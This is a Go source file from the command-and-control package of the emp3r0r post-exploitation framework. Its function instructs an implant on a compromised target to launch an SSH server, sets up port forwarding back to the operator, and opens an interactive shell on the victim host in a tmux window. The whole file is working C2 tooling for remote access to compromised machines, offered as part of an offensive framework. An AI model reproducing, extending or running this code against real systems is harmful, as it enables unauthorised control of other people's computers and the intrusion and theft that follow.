package cc

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strconv"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// SSHClient ssh to sshd server, with shell access in a new tmux window
func SSHClient(shell, port string) (err error) {
	if !util.IsCommandExist("ssh") ||
		!util.IsCommandExist("tmux") ||
		os.Getenv("TMUX") == "" {
		err = fmt.Errorf("ssh and tmux must be installed, and emp3r0r must be run under tmux session")
		return
	}

	// start sshd server on target
	cmd := fmt.Sprintf("!sshd %s %s", shell, port)
	err = SendCmdToCurrentTarget(cmd)
	if err != nil {
		return
	}

	// is port mapping already done?
	lport := strconv.Itoa(util.RandInt(2048, 65535))
	to := "127.0.0.1:" + port
	exists := false
	for _, p := range PortFwds {
		if p.Agent == CurrentTarget && p.To == to {
			exists = true
			break
		}
	}

	if !exists {
		// set up port mapping for the ssh session
		CliPrintInfo("Setting up port mapping for sshd")
		pf := &PortFwdSession{}
		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
		pf.Lport, pf.To = lport, to
		go func() {
			err = pf.RunPortFwd()
			if err != nil {
				err = fmt.Errorf("PortFwd failed: %v", err)
				CliPrintError("Start port mapping for sshd: %v", err)
			}
		}()
		CliPrintInfo("Waiting for response from %s", CurrentTarget.Tag)
		if err != nil {
			return
		}
	}

	// wait until the port mapping is ready
wait:
	for i := 0; i < 100; i++ {
		if exists {
			break
		}
		time.Sleep(100 * time.Millisecond)
		for _, p := range PortFwds {
			if p.Agent == CurrentTarget && p.To == to {
				exists = true
				break wait
			}
		}
	}
	if !exists {
		err = errors.New("Port mapping unsuccessful")
		return
	}

	// let's do the ssh
	CliPrintSuccess("Opening SSH session for %s in new tmux window", CurrentTarget.Tag)
	sshCmd := fmt.Sprintf("ssh -p %s 127.0.0.1", lport)
	return TmuxNewWindow(fmt.Sprintf("ssh-%s", CurrentTarget.Hostname), sshCmd)
}
